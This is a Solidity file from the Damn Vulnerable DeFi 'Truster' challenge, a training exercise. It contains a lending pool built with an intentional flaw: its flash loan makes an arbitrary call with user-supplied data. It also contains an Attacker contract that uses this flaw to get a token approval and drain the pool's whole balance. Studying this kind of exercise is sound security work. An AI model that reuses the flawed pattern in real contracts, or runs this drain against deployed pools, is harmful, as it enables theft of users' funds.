// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
}


contract Attacker {
    TrusterLenderPool public immutable pool;
    DamnValuableToken public immutable token;


    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address receiver) {
        pool = _pool;
        token = _token;

        bytes memory callData = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            token.balanceOf(address(pool))
        );

        pool.flashLoan(
            0, // to make repay possible
            address(this),
            address(token),
            callData
        );

        token.transferFrom(address(pool), receiver, token.balanceOf(address(pool)));
    }
}
